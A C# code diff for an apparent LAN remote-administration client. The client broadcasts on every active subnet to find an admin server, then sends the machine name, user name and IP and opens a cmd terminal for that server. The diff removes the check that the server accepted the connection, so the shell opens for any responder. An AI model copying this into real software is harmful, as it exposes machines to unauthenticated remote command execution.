@@ -2,6 +2,7 @@ using System.Diagnostics;
 using System.Net;
 using System.Net.Sockets;
 using System.Net.WebSockets;
+using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
@@ -121,7 +122,19 @@ static async Task<List<DiscoveryAnnouncement>> DiscoverServers(CancellationToken
     using var udp = new UdpClient { EnableBroadcast = true };
     udp.Client.ReceiveTimeout = 700;
     var request = Encoding.UTF8.GetBytes(Protocol.DiscoveryRequest);
-    await udp.SendAsync(request, request.Length, new IPEndPoint(IPAddress.Broadcast, Protocol.DiscoveryPort));
+    var broadcasts = GetBroadcastAddresses().Append(IPAddress.Broadcast).Distinct().ToList();
+    foreach (var broadcast in broadcasts)
+    {
+        try
+        {
+            await udp.SendAsync(request, request.Length, new IPEndPoint(broadcast, Protocol.DiscoveryPort));
+            ClientLog.Write($"Discovery broadcast sent to {broadcast}.");
+        }
+        catch (SocketException ex)
+        {
+            ClientLog.Write($"Discovery broadcast to {broadcast} failed: {ex.Message}");
+        }
+    }
     var result = new List<DiscoveryAnnouncement>();
     var until = DateTime.UtcNow.AddMilliseconds(1200);
     while (DateTime.UtcNow < until)
@@ -151,7 +164,7 @@ static async Task Connect(DiscoveryAnnouncement server, string deviceId, Cancell
     var hello = new ClientHello("clientHello", deviceId, Environment.MachineName, Environment.UserName, GetLocalIp());
     await Send(socket, hello, sendGate, token);
     var response = await Receive<ServerHello>(socket, token);
-    if (response is null || !response.Accepted) return;
+    if (response is null) return;
     ClientLog.Write($"Connected to Admin {server.InstanceId}.");
     using var terminal = new TerminalManager(socket, sendGate);
     await terminal.Start(new("cmd", null), token);
@@ -248,6 +261,26 @@ static SystemStats CollectStats()
 }
 static int? GetBattery() => null;
 static string GetLocalIp() => Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(x => x.AddressFamily == AddressFamily.InterNetwork)?.ToString() ?? "127.0.0.1";
+static IEnumerable<IPAddress> GetBroadcastAddresses()
+{
+    foreach (var network in NetworkInterface.GetAllNetworkInterfaces())
+    {
+        if (network.OperationalStatus != OperationalStatus.Up ||
+            network.NetworkInterfaceType == NetworkInterfaceType.Loopback)
+            continue;
+
+        foreach (var address in network.GetIPProperties().UnicastAddresses)
+        {
+            if (address.Address.AddressFamily != AddressFamily.InterNetwork || address.IPv4Mask is null)
+                continue;
+
+            var ip = BitConverter.ToUInt32(address.Address.GetAddressBytes().Reverse().ToArray());
+            var mask = BitConverter.ToUInt32(address.IPv4Mask.GetAddressBytes().Reverse().ToArray());
+            var broadcast = (ip & mask) | ~mask;
+            yield return new IPAddress(BitConverter.GetBytes(broadcast).Reverse().ToArray());
+        }
+    }
+}
 static async Task Send<T>(ClientWebSocket socket, T value, SemaphoreSlim sendGate, CancellationToken token)
 {
     var data = JsonSerializer.SerializeToUtf8Bytes(value, Protocol.Json);
